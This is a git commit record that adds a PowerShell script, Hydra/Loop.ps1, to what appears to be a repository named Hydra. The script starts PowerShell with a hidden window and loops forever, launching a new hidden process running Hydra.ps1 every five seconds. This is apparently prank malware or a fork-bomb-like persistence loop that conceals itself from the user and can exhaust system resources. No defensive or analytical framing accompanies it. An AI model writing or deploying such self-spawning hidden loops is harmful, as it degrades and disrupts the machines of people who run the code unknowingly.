b751db969987b43e7addd4816b34775f880d9e9c
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2023-08-22 22:29:41 +0800

    Add files via upload

---
+++ Hydra/Loop.ps1
@@ -0,0 +1,6 @@
+﻿Powershell.exe -windowstyle hidden {
+    While($true){
+        Start-Process powershell.exe -Argumentlist "-file .\Hydra.ps1" -windowstyle hidden
+        Start-Sleep -Seconds 5
+    }
+}
